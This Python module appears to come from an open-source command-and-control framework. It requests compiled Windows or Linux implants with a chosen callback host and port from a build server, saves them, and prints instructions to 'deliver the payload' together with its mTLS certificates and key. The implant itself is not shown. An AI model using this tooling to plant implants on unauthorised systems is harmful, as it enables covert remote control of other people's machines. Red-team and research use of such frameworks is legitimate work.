
# EyeStoneC2 - Command & Control framework
# Copyright (C) 2025 Gabriel Pérez Navarro

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

#!/usr/bin/env python3

import subprocess
import secrets
import string
import requests
from pathlib import Path
from mtls import PKIManager
import os
from dotenv import load_dotenv

class ImplantGenerator():

    COMPILATION_SERVER_WINDOWS = os.getenv("COMPILATION_SERVER_WINDOWS")
    COMPILATION_SERVER_LINUX = os.getenv("COMPILATION_SERVER_LINUX")

    compilation_url_windows = f'http://{COMPILATION_SERVER_WINDOWS}/compile'
    compilation_url_linux = f'http://{COMPILATION_SERVER_LINUX}/compile'

    @staticmethod
    def generate(localhost, localport, platform):

        print("[...] Generating implant...")

        try:

            implant_filename = ImplantGenerator.random_string(8)

            if platform == 'windows':

                ImplantGenerator.request_implant(localhost, localport, platform, implant_filename, ImplantGenerator.compilation_url_windows)

            else:

                ImplantGenerator.request_implant(localhost, localport, platform, implant_filename, ImplantGenerator.compilation_url_linux)

            PKIManager.generate_agent(implant_filename)

        except Exception as e:

            print("[!] ERROR while generating the implant...")
            print(e)


    @staticmethod
    def random_string(length):

        random_string = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
        return random_string


    @staticmethod
    def request_implant(localhost, localport, platform, implant_filename, url):

        implant_data = {"localhost": localhost, "localport": localport, "filename": implant_filename}

        print("\n[...] Requesting compilation to the server. This may take a while...")

        response = requests.post(url, json=implant_data)

        if response.status_code == 200 and response.headers['Content-Type'] == 'application/octet-stream':
            print('\n[+] Compilation succeeded - Downloading implant file...')
            ImplantGenerator.download_implant(response.content, platform, implant_filename)

        else:

            print("\n[!] Compilation failed - Please try again or check the compilation server")


    @staticmethod
    def download_implant(content, platform, implant_filename):

        filename = ''

        if platform == 'windows':
            filename = f'{implant_filename}.exe'

        else:
            filename = implant_filename

        full_path = Path(f"./compiled/{filename}")

        full_path.parent.mkdir(parents=True, exist_ok=True)

        with full_path.open('wb') as outfile:

            outfile.write(content)
        print(f"[+] Implant downloaded - Path: {full_path}")
        print("[+] Please create a listener and deliver the payload")
        print("\n[!] IMPORTANT: please deliver both the CA certificate and the agent certificate and key")

        print("\n[+] CA Certificate:")
        print("\t- Server path (source): mtls/certificate_authority/ca.crt")
        print("\t- Agent path (destination): \n\t\t- Linux --> /opt/ca.crt\n\t\t- Windows --> C:\\Users\\Public\\ca.crt")

        print("\n[+] Agent Certificate:")
        print(f"\t- Server path (source): mtls/agents/{implant_filename}/agent.crt")
        print("\t- Agent path (destination): \n\t\t- Linux --> /opt/agent.crt\n\t\t- Windows --> C:\\Users\\Public\\agent.crt")


        print("\n[+] Agent Private Key:")
        print(f"\t- Server path (source): mtls/agents/{implant_filename}/agent.key")
        print("\t- Agent path (destination): \n\t\t- Linux --> /opt/agent.key\n\t\t- Windows --> C:\\Users\\Public\\agent.key")




